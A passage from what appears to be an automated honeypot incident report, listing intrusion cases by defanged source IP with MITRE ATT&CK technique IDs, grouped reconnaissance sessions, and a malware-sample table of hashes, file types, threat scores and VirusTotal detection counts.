| IR-94f20952ebaa | HIGH | `103.146.52[.]157` | 2026-11-05 05:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4d3f79d092c0 | HIGH | `103.146.52[.]157` | 2026-11-05 05:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1fca612201ad | HIGH | `35.210.9[.]177` | 2026-11-05 05:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-efcbf5869c06 | HIGH | `202.46.28[.]140` | 2026-11-05 06:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2514c4b100fa | HIGH | `202.46.28[.]140` | 2026-11-05 06:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9af38b3bf822 | HIGH | `103.189.89[.]145` | 2026-11-05 06:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e4842f118def | HIGH | `103.189.89[.]145` | 2026-11-05 06:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9d923f882728 | HIGH | `176.65.132[.]216` | 2026-11-05 06:05 | Y | 0 | 0 | `T1078` |
| IR-1ac90febdbd1 | HIGH | `35.222.117[.]243` | 2026-11-05 06:18 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bb7f74ca2032 | HIGH | `35.222.117[.]243` | 2026-11-05 06:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9bef4b5ea511 | HIGH | `175.210.232[.]163` | 2026-11-05 06:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-984834f78d36 | HIGH | `120.193.9[.]169` | 2026-11-05 06:19 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9209561e3688 | HIGH | `138.226.239[.]233` | 2026-11-05 06:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6989e963310a | HIGH | `107.155.55[.]85` | 2026-11-05 06:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-092e45fd0513 | HIGH | `14.29.198[.]130` | 2026-11-05 06:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dbdfc7f6baf0 | HIGH | `107.155.55[.]85` | 2026-11-05 06:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9bf42c8cc448 | HIGH | `14.29.198[.]130` | 2026-11-05 06:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2490aa2ab50e | HIGH | `49.0.87[.]123` | 2026-11-05 06:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8f58456b75c9 | HIGH | `49.0.87[.]123` | 2026-11-05 06:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ae1006040d8 | HIGH | `115.191.45[.]206` | 2026-11-05 06:48 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-9ba02db7f8d3 | HIGH | `193.32.162[.]15` | 2026-11-05 06:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4e0d049abcd2 | HIGH | `45.79.128[.]205` | 2026-11-05 07:10 | Y | 3 | 0 | `T1078` |
| IR-a44a3829b3fa | HIGH | `91.186.216[.]80` | 2026-11-05 07:33 | Y | 4 | 0 | `T1078` |
| IR-ac9d28fae292 | HIGH | `102.88.137[.]80` | 2026-11-05 08:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5d367a73b9d8 | HIGH | `102.88.137[.]80` | 2026-11-05 08:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e7c45bdf26ef | HIGH | `50.6.195[.]65` | 2026-11-05 08:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e3b22f9848d5 | HIGH | `50.6.195[.]65` | 2026-11-05 08:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-575a5d776765 | HIGH | `106.15.236[.]209` | 2026-11-05 08:19 | Y | 10 | 0 | `T1003.008 · T1059.004 · T1078` |
| IR-c94de445ada3 | HIGH | `190.149.6[.]54` | 2026-11-05 08:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-37dcc767d8d1 | HIGH | `190.149.6[.]54` | 2026-11-05 08:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-45c07306d58d | HIGH | `103.98.176[.]164` | 2026-11-05 08:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-40bbe8311da0 | HIGH | `103.98.176[.]164` | 2026-11-05 08:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6b7a6ea13b9e | HIGH | `52.170.194[.]23` | 2026-11-05 08:48 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8e65cc5943b1 | HIGH | `176.53.159[.]196` | 2026-11-05 08:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2c69637a0d09 | HIGH | `191.249.229[.]125` | 2026-11-05 08:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1afcc0b5ecd0 | HIGH | `191.249.229[.]125` | 2026-11-05 08:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b15d66a4985f | HIGH | `95.188.91[.]101` | 2026-11-05 09:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7fa00108c166 | HIGH | `95.188.91[.]101` | 2026-11-05 09:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f8146460699e | HIGH | `128.14.229[.]181` | 2026-11-05 09:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5feeac406be5 | HIGH | `128.14.229[.]181` | 2026-11-05 09:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c8772fc6eff1 | HIGH | `14.103.41[.]249` | 2026-11-05 09:07 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-cf6314ea798a | HIGH | `138.226.239[.]233` | 2026-11-05 09:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-456f7c3a3e9f | HIGH | `195.178.110[.]78` | 2026-11-05 09:32 | Y | 3 | 0 | `T1078 · T1083` |
| IR-374cf7d60f6d | HIGH | `94.184.37[.]37` | 2026-11-05 09:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c98628586d7f | HIGH | `94.184.37[.]37` | 2026-11-05 09:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1b22a0e775ad | HIGH | `50.6.243[.]128` | 2026-11-05 09:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-89ba3878e39d | HIGH | `50.6.243[.]128` | 2026-11-05 09:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ef8aa5d5332 | HIGH | `109.160.32[.]174` | 2026-11-05 09:59 | Y | 1 | 0 | `T1078 · T1592` |
| IR-82bca57ed13c | HIGH | `109.160.32[.]174` | 2026-11-05 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-31350033c87c | HIGH | `92.118.39[.]77` | 2026-11-05 10:00 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8a77d9d86813 | HIGH | `165.245.250[.]118` | 2026-11-05 10:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-686a32ebc523 | HIGH | `165.245.250[.]118` | 2026-11-05 10:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c3d7a70d290f | HIGH | `92.118.39[.]77` | 2026-11-05 10:02 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8233423a132e | HIGH | `92.118.39[.]77` | 2026-11-05 10:04 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-151925d6eef5 | HIGH | `92.118.39[.]77` | 2026-11-05 10:06 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-d5ea5b129bdf | HIGH | `92.118.39[.]77` | 2026-11-05 10:08 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5096742a9e5f | HIGH | `92.118.39[.]77` | 2026-11-05 10:10 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-39f450ff550f | HIGH | `92.118.39[.]77` | 2026-11-05 10:12 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5be27badb545 | HIGH | `92.118.39[.]77` | 2026-11-05 10:16 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-42d9686020d4 | HIGH | `92.118.39[.]77` | 2026-11-05 10:18 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b137a72b7154 | HIGH | `92.118.39[.]77` | 2026-11-05 10:20 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-02961692fee1 | HIGH | `92.118.39[.]77` | 2026-11-05 10:22 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5fb81e1a7adf | HIGH | `195.178.110[.]78` | 2026-11-05 10:22 | Y | 3 | 0 | `T1078 · T1083` |
| IR-c47b1d909d21 | HIGH | `92.118.39[.]77` | 2026-11-05 10:24 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b0aca5799048 | HIGH | `176.53.159[.]196` | 2026-11-05 10:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6bb40d0d101b | HIGH | `92.118.39[.]77` | 2026-11-05 10:26 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-34b84830a14a | HIGH | `92.118.39[.]77` | 2026-11-05 10:28 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9d57b2086c1a | HIGH | `92.118.39[.]77` | 2026-11-05 10:30 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-fb8a94868819 | HIGH | `92.118.39[.]77` | 2026-11-05 10:32 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9090dd1e43f5 | HIGH | `92.118.39[.]77` | 2026-11-05 10:34 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e4fa716aeff1 | HIGH | `92.118.39[.]77` | 2026-11-05 10:36 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ba1ee3ce3f2e | HIGH | `92.118.39[.]77` | 2026-11-05 10:38 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-fa3e31f1622f | HIGH | `92.118.39[.]77` | 2026-11-05 10:40 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-98d55c0e7c37 | HIGH | `139.45.211[.]5` | 2026-11-05 10:41 | Y | 6 | 0 | `T1078 · T1083` |
| IR-ad2682155825 | HIGH | `92.118.39[.]77` | 2026-11-05 10:42 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-d32f2d0bb6b4 | HIGH | `92.118.39[.]77` | 2026-11-05 10:44 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e63ff7e98a02 | HIGH | `92.118.39[.]77` | 2026-11-05 10:46 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
_… 81 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **4** | 2026-11-05 09:03 | 2026-11-05 14:01 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-11-05 12:27 | 2026-11-05 18:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-11-05 03:06 | 2026-11-05 06:05 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-11-05 06:21 | 2026-11-05 10:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]174` | **2** | 2026-11-05 09:58 | 2026-11-05 10:21 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-11-05 03:07 | 2026-11-05 04:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | **2** | 2026-11-05 03:53 | 2026-11-05 04:09 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]168` | **2** | 2026-11-05 17:35 | 2026-11-05 18:01 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.131.220[.]121` | **2** | 2026-11-05 17:58 | 2026-11-05 18:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | **2** | 2026-11-05 09:57 | 2026-11-05 10:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.211.93[.]25` | 1 | 2026-11-05 03:30 | 2026-11-05 03:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.131.61[.]163` | 1 | 2026-11-05 15:02 | 2026-11-05 15:03 | 34s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-11-05 14:08 | 2026-11-05 14:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.80.162[.]147` | 1 | 2026-11-05 03:07 | 2026-11-05 03:08 | 32s | 0 | `T1592` | 🟢 LOW |
| `105.224.44[.]84` | 1 | 2026-11-05 10:23 | 2026-11-05 10:24 | 32s | 0 | `T1592` | 🟢 LOW |
| `106.13.1[.]7` | 1 | 2026-11-05 06:42 | 2026-11-05 06:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.41.51[.]143` | 1 | 2026-11-05 04:44 | 2026-11-05 04:44 | 12s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]139` | 1 | 2026-11-05 17:01 | 2026-11-05 17:01 | 8s | 0 | `T1592` | 🟢 LOW |
| `114.219.157[.]97` | 1 | 2026-11-05 18:27 | 2026-11-05 18:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.181[.]231` | 1 | 2026-11-05 12:36 | 2026-11-05 12:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.243[.]73` | 1 | 2026-11-05 12:50 | 2026-11-05 12:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.52[.]2` | 1 | 2026-11-05 06:37 | 2026-11-05 06:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.1.149[.]196` | 1 | 2026-11-05 15:02 | 2026-11-05 15:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.177.172[.]108` | 1 | 2026-11-05 07:37 | 2026-11-05 07:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.50.73[.]90` | 1 | 2026-11-05 12:07 | 2026-11-05 12:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.167.206[.]194` | 1 | 2026-11-05 18:29 | 2026-11-05 18:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.193.9[.]169` | 1 | 2026-11-05 06:19 | 2026-11-05 06:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.27.109[.]9` | 1 | 2026-11-05 14:09 | 2026-11-05 14:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.44[.]93` | 1 | 2026-11-05 13:03 | 2026-11-05 13:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.122.102[.]148` | 1 | 2026-11-05 18:28 | 2026-11-05 18:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-11-05 16:55 | 2026-11-05 16:55 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.117[.]85` | 1 | 2026-11-05 18:01 | 2026-11-05 18:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.126[.]104` | 1 | 2026-11-05 04:08 | 2026-11-05 04:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `140.82.37[.]138` | 1 | 2026-11-05 06:20 | 2026-11-05 06:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-05 08:40 | 2026-11-05 08:41 | 61s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-05 10:58 | 2026-11-05 10:58 | 35s | 0 | `T1592` | 🟢 LOW |
| `165.154.182[.]182` | 1 | 2026-11-05 03:30 | 2026-11-05 03:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.231.237[.]214` | 1 | 2026-11-05 07:40 | 2026-11-05 07:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]46` | 1 | 2026-11-05 14:38 | 2026-11-05 14:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]111` | 1 | 2026-11-05 04:57 | 2026-11-05 04:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | 1 | 2026-11-05 14:06 | 2026-11-05 14:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-05 08:48 | 2026-11-05 08:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.114[.]151` | 1 | 2026-11-05 08:11 | 2026-11-05 08:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.135[.]219` | 1 | 2026-11-05 17:59 | 2026-11-05 18:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-11-05 18:27 | 2026-11-05 18:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.118.64[.]225` | 1 | 2026-11-05 08:42 | 2026-11-05 08:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.92.207[.]103` | 1 | 2026-11-05 11:02 | 2026-11-05 11:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.4.35[.]109` | 1 | 2026-11-05 10:55 | 2026-11-05 10:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.22.62[.]80` | 1 | 2026-11-05 06:44 | 2026-11-05 06:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.100.196[.]203` | 1 | 2026-11-05 09:37 | 2026-11-05 09:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.3.53[.]2` | 1 | 2026-11-05 04:16 | 2026-11-05 04:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-05 06:52 | 2026-11-05 06:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-05 13:20 | 2026-11-05 13:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-11-05 10:07 | 2026-11-05 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.31.5[.]41` | 1 | 2026-11-05 08:20 | 2026-11-05 08:20 | 33s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-11-05 04:57 | 2026-11-05 04:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.65.170[.]203` | 1 | 2026-11-05 05:51 | 2026-11-05 05:51 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.65.219[.]156` | 1 | 2026-11-05 08:40 | 2026-11-05 08:41 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.83.44[.]118` | 1 | 2026-11-05 04:11 | 2026-11-05 04:11 | 9s | 0 | `T1592` | 🟢 LOW |
| `200.138.46[.]136` | 1 | 2026-11-05 08:46 | 2026-11-05 08:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.155.100[.]9` | 1 | 2026-11-05 13:37 | 2026-11-05 13:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.227.226[.]130` | 1 | 2026-11-05 11:56 | 2026-11-05 11:57 | 12s | 0 | `T1592` | 🟢 LOW |
| `217.25.83[.]245` | 1 | 2026-11-05 06:31 | 2026-11-05 06:31 | 12s | 0 | `T1592` | 🟢 LOW |
| `218.94.137[.]166` | 1 | 2026-11-05 07:47 | 2026-11-05 07:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.17.143[.]107` | 1 | 2026-11-05 12:40 | 2026-11-05 12:41 | 27s | 0 | `T1592` | 🟢 LOW |
| `223.223.177[.]99` | 1 | 2026-11-05 13:48 | 2026-11-05 13:48 | 3s | 1 | `T1110.001` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-05 12:55 | 2026-11-05 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | 1 | 2026-11-05 10:11 | 2026-11-05 10:11 | 9s | 0 | `T1592` | 🟢 LOW |
| `31.184.195[.]248` | 1 | 2026-11-05 14:06 | 2026-11-05 14:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.173[.]188` | 1 | 2026-11-05 05:23 | 2026-11-05 05:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.159[.]255` | 1 | 2026-11-05 05:58 | 2026-11-05 05:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.223[.]144` | 1 | 2026-11-05 04:43 | 2026-11-05 04:44 | 7s | 0 | `T1592` | 🟢 LOW |
| `35.210.62[.]153` | 1 | 2026-11-05 04:14 | 2026-11-05 04:14 | 3s | 0 | `T1592` | 🟢 LOW |
| `35.210.9[.]177` | 1 | 2026-11-05 05:57 | 2026-11-05 05:57 | 5s | 0 | `T1592` | 🟢 LOW |
| `37.52.148[.]63` | 1 | 2026-11-05 07:32 | 2026-11-05 07:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]235` | 1 | 2026-11-05 17:51 | 2026-11-05 17:52 | 60s | 0 | `T1592` | 🟢 LOW |
| `4.249.17[.]208` | 1 | 2026-11-05 12:07 | 2026-11-05 12:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `40.124.84[.]250` | 1 | 2026-11-05 14:19 | 2026-11-05 14:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-11-05 07:09 | 2026-11-05 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-11-05 16:09 | 2026-11-05 16:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.167.225[.]179` | 1 | 2026-11-05 17:31 | 2026-11-05 17:31 | 32s | 0 | `T1592` | 🟢 LOW |
| `45.33.80[.]243` | 1 | 2026-11-05 13:08 | 2026-11-05 13:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-11-05 14:38 | 2026-11-05 14:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.128[.]205` | 1 | 2026-11-05 07:10 | 2026-11-05 07:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-05 05:39 | 2026-11-05 05:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-05 08:38 | 2026-11-05 08:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-11-05 08:38 | 2026-11-05 08:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.151.178[.]14` | 1 | 2026-11-05 14:45 | 2026-11-05 14:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.107.125[.]120` | 1 | 2026-11-05 18:22 | 2026-11-05 18:23 | 88s | 0 | `T1592` | 🟢 LOW |
| `47.120.4[.]180` | 1 | 2026-11-05 18:49 | 2026-11-05 18:49 | 46s | 0 | `T1592` | 🟢 LOW |
| `5.129.189[.]56` | 1 | 2026-11-05 13:35 | 2026-11-05 13:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-11-05 04:11 | 2026-11-05 04:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.170.194[.]23` | 1 | 2026-11-05 08:48 | 2026-11-05 08:48 | 6s | 0 | `T1592` | 🟢 LOW |
| `58.209.234[.]84` | 1 | 2026-11-05 08:05 | 2026-11-05 08:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.205.72[.]140` | 1 | 2026-11-05 08:09 | 2026-11-05 08:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.34.87[.]145` | 1 | 2026-11-05 12:48 | 2026-11-05 12:48 | 2s | 1 | `T1110.001` | 🟢 LOW |
| `64.62.197[.]107` | 1 | 2026-11-05 06:35 | 2026-11-05 06:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-05 03:03 | 2026-11-05 03:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]121` | 1 | 2026-11-05 18:31 | 2026-11-05 18:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]125` | 1 | 2026-11-05 03:33 | 2026-11-05 03:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]128` | 1 | 2026-11-05 13:32 | 2026-11-05 13:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]221` | 1 | 2026-11-05 13:32 | 2026-11-05 13:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]159` | 1 | 2026-11-05 04:25 | 2026-11-05 04:25 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]192` | 1 | 2026-11-05 03:33 | 2026-11-05 03:34 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]197` | 1 | 2026-11-05 11:30 | 2026-11-05 11:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]74` | 1 | 2026-11-05 13:32 | 2026-11-05 13:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]233` | 1 | 2026-11-05 03:33 | 2026-11-05 03:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]87` | 1 | 2026-11-05 04:54 | 2026-11-05 04:55 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.76.203[.]71` | 1 | 2026-11-05 13:55 | 2026-11-05 13:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-05 06:10 | 2026-11-05 06:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-05 11:00 | 2026-11-05 11:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]6` | 1 | 2026-11-05 10:51 | 2026-11-05 10:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.249.185[.]246` | 1 | 2026-11-05 17:25 | 2026-11-05 17:26 | 13s | 0 | `T1592` | 🟢 LOW |
| `81.172.120[.]224` | 1 | 2026-11-05 06:29 | 2026-11-05 06:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]25` | 1 | 2026-11-05 05:29 | 2026-11-05 05:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.247.91[.]89` | 1 | 2026-11-05 14:21 | 2026-11-05 14:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.177.189[.]165` | 1 | 2026-11-05 07:46 | 2026-11-05 07:46 | 14s | 0 | `T1592` | 🟢 LOW |
| `95.188.91[.]101` | 1 | 2026-11-05 09:15 | 2026-11-05 09:17 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
